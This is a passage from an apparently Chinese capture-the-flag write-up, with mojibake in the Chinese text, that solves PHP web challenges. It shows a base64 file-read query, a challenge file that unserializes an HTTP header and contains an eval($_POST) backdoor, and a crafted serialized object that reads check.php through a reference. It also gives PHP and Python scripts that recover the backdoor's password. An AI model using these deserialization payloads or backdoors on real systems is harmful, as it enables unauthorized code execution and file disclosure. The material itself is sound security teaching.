<li>data:image/x-icon;base64,base64ÁºñÁ†ÅÁöÑiconÂõæÁâáÊï∞ÊçÆ</li>
</ul>
<h4 id="3payload">3.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?img=aW5kZXgucGhw
</span></span><span class="line"><span class="cl">// index.phpÔºåbase64ÁºñÁ†ÅÔºöaW5kZXgucGhw
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="Ë¢´ÈÅóÂøòÁöÑÂèçÂ∫èÂàóÂåñ">Ë¢´ÈÅóÂøòÁöÑÂèçÂ∫èÂàóÂåñ</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ÂΩìÂâçÁõÆÂΩï‰∏≠Êúâ‰∏Ä‰∏™txtÊñá‰ª∂Âì¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;check.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">EeE</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$eeee</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span> <span class="o">==</span> <span class="s2">&#34;aaaa&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nx">lcfirst</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$kk</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$kk</span><span class="s2">,eeeeeeeeeeeee&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__clone</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">cycycycy</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="o">-&gt;</span> <span class="na">aaa</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cycycycy</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">aaa</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$get</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;get&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$get</span> <span class="o">=</span> <span class="nx">cipher</span><span class="p">(</span><span class="nv">$get</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$get</span> <span class="o">===</span> <span class="s2">&#34;p8vfuv8g8v8py&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;eval&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a_a</span> <span class="o">=</span> <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\$</span><span class="s2">a_a</span><span class="se">\$</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">gBoBg</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$coos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$eeee</span><span class="o">=</span><span class="s2">&#34;-_-&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">coos</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">coos</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$aa</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">coos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$bb</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$aa</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w_wuw_w</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$aaa</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/php|63|\*|\?/i&#34;</span><span class="p">,</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">key</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;‰∏çË°åÂì¶&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">aaa</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">aaa</span> <span class="o">=</span> <span class="k">clone</span> <span class="k">new</span> <span class="nx">EeE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$_ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;HTTP_AAAAAA&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_ip</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// cloneÂÖ≥ÈîÆÂ≠ó:Áî®‰∫éÂÖãÈöÜ‰∏Ä‰∏™ÂÆåÂÖ®‰∏ÄÊ†∑ÁöÑÂØπË±°ÔºåÂÖãÈöÜ‰πãÂêé‰∏§‰∏™ÂØπË±°‰∫í‰∏çÂπ≤Êâ∞„ÄÇ
</span></span></span><span class="line"><span class="cl"><span class="c1">// __clone() ÊñπÊ≥ïÂè™‰ºöÂú®ÂØπË±°Ë¢´ÂÖãÈöÜÁöÑÊó∂ÂÄôËá™Âä®Ë∞ÉÁî®„ÄÇ
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="1ÂÅöÈ¢òÊÄùË∑Ø-1">1.ÂÅöÈ¢òÊÄùË∑Ø</h4>
<p>ÂÖàÁúã‰ª£Á†ÅÔºåÂâçÈù¢ÊòØÂêÑÁßçÁ±ªÔºåÊúÄ‰∏ãÈù¢ÊúâÂè•ÂèçÂ∫èÂàóÂåñ‰ª£Á†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$_ip = $_SERVER[&#34;HTTP_AAAAAA&#34;];
</span></span></code></pre></td></tr></table>
</div>
</div><p>$ip = $SERVER[&ldquo;HTTP_AAAAAA&rdquo;]; ÔºöÊé•Êî∂headerÂ§¥‰∏≠ aaaaaaÂèÇÊï∞ÁöÑÂÄºÔºåÁÑ∂ÂêéÂ∞ÜÂÖ∂ÂèçÂ∫èÂàóÂåñ„ÄÇ</p>
<p>ÂèëÁé∞È¢òÁõÆÂåÖÂê´‰∫Ücheck.phpÔºåÂ∞ùËØïËØªÂèñÔºåÂà©Áî®w_wuw_wÁ±ª</p>
<p>Ê≠§Á±ªÂèçÂ∫èÂàóÂåñ‰πãÂâçÂÖàËß¶ÂèëwakeupËøô‰∏™ÊñπÊ≥ïÔºåÊ£ÄÊµãkey‰∏≠ÊòØÂê¶ÊúâÂÖ≥ÈîÆÂ≠ó</p>
<p>ÊääËØªÂèñfileÁöÑÂÜÖÂÆπÁªôkeyÔºåÁªìÊùüÊó∂ÊòæÁ§∫aaaÔºåÂèØ‰ª•Áî®ÂºïÁî®ÊääaaaÂèòÈáèÂíåkeyÂèòÈáèÁªëÂÆöÔºåËÆ©aaaÂíåkeyÁöÑÂÜÖÂÆπÁõ∏ÂêåÔºå‰ªéËÄåÁúãÂà∞Êñá‰ª∂ÂÜÖÂÆπ„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w_wuw_w</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$aaa</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">w_wuw_w</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">aaa</span><span class="o">=&amp;</span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="s2">&#34;check.php&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"># Ê†áÂáÜËæìÂá∫ÔºöO:7:&#34;w_wuw_w&#34;:3:{s:3:&#34;aaa&#34;;N;s:3:&#34;key&#34;;R:2;s:4:&#34;file&#34;;s:9:&#34;check.php&#34;;}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>check.phpÁöÑÊ∫êÁ†Å:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">cipher</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">10000</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$charset</span> <span class="o">=</span> <span class="s2">&#34;qwertyuiopasdfghjklzxcvbnm123456789&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$shift</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$shifted</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$char</span> <span class="o">=</span> <span class="nv">$str</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$pos</span> <span class="o">=</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$charset</span><span class="p">,</span> <span class="nv">$char</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$new_pos</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">-</span> <span class="nv">$shift</span> <span class="o">+</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$charset</span><span class="p">))</span> <span class="o">%</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$charset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$shifted</span> <span class="o">.=</span> <span class="nv">$charset</span><span class="p">[</span><span class="nv">$new_pos</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$shifted</span> <span class="o">.=</span> <span class="nv">$char</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$shifted</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèëÁé∞ÂáΩÊï∞cipherÂú®Á±ªcycycycy‰∏≠Ë¢´Ë∞ÉÁî®ÔºåÁåúÊµãÊòØcheck.phpÊòØ‰∏™Âä†ÂØÜËÑöÊú¨„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$get</span> <span class="o">===</span> <span class="s2">&#34;p8vfuv8g8v8py&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;eval&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèØ‰ª•Âú®Á±ªcycycycyÂæóÁü•ÔºåÂØÜÊñá‰∏∫p8vfuv8g8v8py</p>
<p>ËßÇÂØüÂèëÁé∞ÊòØÁÆÄÂçïÁöÑÂáØÊííÁßª‰ΩçÂØÜÁ†ÅÔºåÂèØ‰ª•Âà©Áî®Âú®Á∫øÂ∑•ÂÖ∑ÊàñËÄÖËÑöÊú¨Ëß£ÂØÜ‰∏Ä‰∏ã„ÄÇ</p>
<p>phpËß£ÂØÜËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">decipher</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">10000</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nv">$charset</span> <span class="o">=</span> <span class="s2">&#34;qwertyuiopasdfghjklzxcvbnm123456789&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$shift</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$deciphered</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$char</span> <span class="o">=</span> <span class="nv">$str</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$pos</span> <span class="o">=</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$charset</span><span class="p">,</span> <span class="nv">$char</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$new_pos</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">+</span> <span class="nv">$shift</span><span class="p">)</span> <span class="o">%</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$charset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$deciphered</span> <span class="o">.=</span> <span class="nv">$charset</span><span class="p">[</span><span class="nv">$new_pos</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$deciphered</span> <span class="o">.=</span> <span class="nv">$char</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$deciphered</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>pythonËß£ÂØÜËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">charset</span> <span class="o">=</span> <span class="s1">&#39;qwertyuiopasdfghjklzxcvbnm123456789&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;p8vfuv8g8v8py&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="n">charset</span><span class="p">[(</span><span class="n">charset</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">charset</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ëß£ÂØÜÂêéÊòéÊñá:fe1ka1ele1efp</p>
<p>‰∏∫‰∫ÜÂà©Áî®post‰º†ÂèÇÔºåÈúÄË¶ÅËß¶Âèëaaa()ÊñπÊ≥ïÔºå‰ªéË∞ÅËß¶Âèë‰∫Üaaa()ÊñπÊ≥ïÊù•Êé®ÂØºÔºåÂÄíÁùÄÊé®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
